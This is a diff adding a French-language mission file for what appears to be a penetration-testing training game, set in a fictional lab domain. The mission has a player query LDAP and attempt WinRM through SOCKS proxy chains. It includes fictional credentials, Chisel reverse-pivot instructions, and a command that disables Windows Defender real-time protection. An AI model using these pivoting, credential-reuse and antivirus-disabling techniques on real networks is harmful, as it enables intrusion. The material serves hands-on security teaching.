@@ -1,0 +1,78 @@
+{
+  "contract_id": "act3_droits",
+  "scenario": "act3_droits",
+  "tier": 2,
+  "act": 3,
+  "act_chapter": 7,
+  "channel": "telegrid",
+  "client": {
+    "handle": "traverse",
+    "forum_rep": 80,
+    "account_age_days": 650
+  },
+  "bounty": {
+    "forum": "exployt",
+    "title": "Acte III · 07 — Le réseau des droits",
+    "body": "Iris m’a renvoyé mon tableau : « membre d’un groupe » ne dit pas « connexion autorisée partout ». Lis ~/mission/suite.txt. Interroge l’annuaire, puis essaie le compte audit sur le contrôle WinRM .23. Je veux les deux observations, même si la connexion est refusée."
+  },
+  "brief": "Iris m’a renvoyé mon tableau : « membre d’un groupe » ne dit pas « connexion autorisée partout ». Lis ~/mission/suite.txt. Interroge l’annuaire, puis essaie le compte audit sur le contrôle WinRM .23. Je veux les deux observations, même si la connexion est refusée.\n\nDocumentation locale dans ~/docs ; indice et rappel détaillé disponibles ici. Confirme « constat ».",
+  "reward": 850,
+  "reputation": 20,
+  "required_items": [],
+  "required_completed": [
+    "act3_winrm"
+  ],
+  "success_message": "Constats reçus. L’annuaire et l’autorisation du service restent deux vérifications distinctes. Règlement de {reward} ₵ dans ColdVault.",
+  "failure_message": "On reprend depuis les constats enregistrés au débriefing. Pas besoin d’inventer un accès pour conclure.",
+  "guide": [],
+  "investigation_steps": [
+    {
+      "id": "constat",
+      "tokens": [
+        "preuve"
+      ],
+      "requires": [
+        {
+          "type": "ldap_entries",
+          "dns": [
+            "CN=audit,CN=Users,DC=lenoir,DC=lab",
+            "CN=Lecteurs maintenance,CN=Users,DC=lenoir,DC=lab"
+          ]
+        },
+        {
+          "type": "tool_fact",
+          "key": "winrm:denied:control"
+        }
+      ],
+      "response": "Constats reçus. L’annuaire et l’autorisation du service restent deux vérifications distinctes.",
+      "already": "Oui, constat reçu.",
+      "missing": "Il manque une observation vérifiable.",
+      "hint": "Avec le SOCKS Aster actif : proxychains4 -f ~/routes/aster.conf ldapsearch -x -H ldap://10.90.30.10 -D audit@lenoir.lab -w LectureLenoir2026! -b DC=lenoir,DC=lab \"(objectClass=*)\" ; puis proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.23 -u audit -p LectureLenoir2026!. Le refus est attendu. Confirme constat. Avant LDAP : proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 389 10.90.30.10.",
+      "hints": [
+        "Lis les passations locales et compare les origines réseau avant de choisir ton outil.",
+        "Une action refusée peut être une preuve ; elle ne crée aucun accès supplémentaire."
+      ]
+    }
+  ],
+  "local_files": {
+    "/home/operator/docs/reconnaissance.txt": "Reconnaissance — documentation locale du simulateur\nnmap --help : options couvertes. -Pn saute la découverte préalable ; il ne traverse pas un pare-feu et ne crée aucune route.\nUn port open répond, closed refuse la connexion, filtered ne fournit pas de réponse exploitable. La découverte peut échouer alors que TCP/22 répond.\nExercice de syntaxe, adresses différentes du dossier : nmap -sV -p 22,80 192.0.2.10 ; puis nmap -Pn -sV -p 22,80 192.0.2.10.\nSur un relais : ip addr ; ip route ; ss -lnt ; nmap -sV -p 80 192.0.2.20.\nSSH : ssh utilisateur@adresse ; saisir le secret au prompt ; whoami ; hostname ; exit.\nUne nouvelle console reste locale. Les droits de lecture SSH ne sont pas des droits administrateur du domaine.\n",
+    "/home/operator/mission/ticket.txt": "LN-FW-301 : sondes de découverte usuelles filtrées depuis opérateur vers 10.90.10.10 ; TCP/22 maintenu pour maintenance. Cette règle ne décrit aucun accès aux réseaux internes.\n",
+    "/home/operator/mission/passations.txt": "Ancienne passation : ASTER-ANCIEN 10.90.10.11, retirée du service.\nActuelle : ASTER-MAINT 10.90.10.10 ; compte maintenance ; secret AsterLecture2026! ; lecture uniquement.\n",
+    "/home/operator/routes/aster.conf": "strict_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\n",
+    "/home/operator/docs/transports.txt": "Transports — aide locale\nLe premier serveur Chisel se lance sur Kali et reste dans sa console. Un second serveur peut se lancer sur un relais équipé. Le client est installé sur ASTER-MAINT et s’exécute dans sa session SSH. Une console supplémentaire sert à tester le résultat.\nExemple d’exercice : chisel server --reverse --port 9000 ; sur le relais : chisel client http://192.0.2.1:9000 R:8081:192.0.2.20:80 ; depuis Kali : curl http://127.0.0.1:8081/document.txt.\nSOCKS inverse : remplacer le remote par R:1080:socks. ProxyChains ne transporte ici que TCP. Configuration strict_chain, puis [ProxyList], puis socks5 127.0.0.1 1080.\nproxychains4 -f CONFIG nmap -sT -Pn -n -p 80 ADRESSE ; proxychains4 -f CONFIG curl URL.\nEvil-WinRM : evil-winrm -i ADRESSE -u COMPTE -p SECRET ; -S sélectionne TLS, -P change le port. Utilisable avec ProxyChains. Une session ouvre PowerShell ; whoami, Get-Content, exit sont disponibles.\nAides : chisel --help, proxychains4 --help, evil-winrm -h. ps aux et ss -lntp permettent de vérifier les processus et les écouteurs. Ctrl+C ou kill PID interrompt un transport ; fermer sa console l’arrête aussi. Une sauvegarde conserve les processus virtuels, pas une connexion réelle.\nCouverture : serveur Chisel local ou sur relais équipé, client distant, une redirection inverse TCP ou SOCKS par client ; chaîne stricte de SOCKS5 IPv4 ; clients Nmap TCP, curl, LDAP (-w, sans invite -W) et Evil-WinRM. Les autres options sont signalées hors couverture.\n",
+    "/home/operator/mission/suite.txt": "Passation LN-307 : annuaire 10.90.30.10 LDAP/389 ; base DC=lenoir,DC=lab ; audit@lenoir.lab / LectureLenoir2026!. Contrôle WinRM 10.90.40.23 : audit non autorisé. Diagnostic Windows 10.90.40.21 : ops.local / ControleLocal2026!, administrateur local uniquement ; même compte sur contrôle .23. Passerelle Recherche SSH 10.90.40.22 : relais / PassageLecture2026!. Avenant LN-310 consultable sur cette passerelle. Secours Aster .12 disponible.\n",
+    "/home/operator/routes/recherche.conf": "strict_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 10.90.10.10 1081\n",
+    "/home/operator/routes/secours.conf": "strict_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 10.90.10.12 1081\n",
+    "/home/operator/docs/protections.txt": "Images Defender du laboratoire : Get-MpComputerStatus ; Get-MpPreference ; Get-HotFix ; Get-WinEvent -LogName \"Microsoft-Windows-Windows Defender/Operational\". Les journaux et versions décrivent cet état précis, pas une recette universelle. Set-MpPreference -DisableRealtimeMonitoring $true nécessite les droits locaux et peut être bloqué par l’anti-tamper. Relire Get-MpComputerStatus après toute tentative. Le fichier C:\\Tools\\sharphound.exe a été déposé par le propriétaire : présence, exécution et collecte sont trois constats différents. LDAP peut fournir les informations autorisées sans exécuter cette collecte.\n",
+    "/home/operator/docs/second-pivot.txt": "Le premier SOCKS arrive sur Kali:1080. Ouvrir un serveur Chisel sur Aster:8001 dans une autre session SSH ; depuis la passerelle applicative, chisel client http://ADRESSE_ASTER:8001 R:1081:socks. Le SOCKS:1081 écoute sur Aster, pas sur Kali. La chaîne stricte passe par Kali:1080 puis Aster:1081. Chacun garde sa console ouverte. Un nmap -sT -Pn -n via cette chaîne voit la Recherche depuis la passerelle applicative. Arrêter le premier passage coupe toute la chaîne. Repli : nouvelle chaîne par ASTER-SECOURS, sans réutiliser les PID de l’ancien passage.\n"
+  },
+  "private_offer": true,
+  "intro": "Iris m’a renvoyé mon tableau : « membre d’un groupe » ne dit pas « connexion autorisée partout ». Lis ~/mission/suite.txt. Interroge l’annuaire, puis essaie le compte audit sur le contrôle WinRM .23. Je veux les deux observations, même si la connexion est refusée.",
+  "relaxed_clock": true,
+  "terminal_revision": 1,
+  "dialogue": {
+    "greeting": "Salut. J’ai les pièces Aster ouvertes, on peut comparer.",
+    "ack": "D’accord, je garde ça avec les observations.",
+    "fallback": "Tu parles de quelle machine, et depuis quelle console ?"
+  }
+}
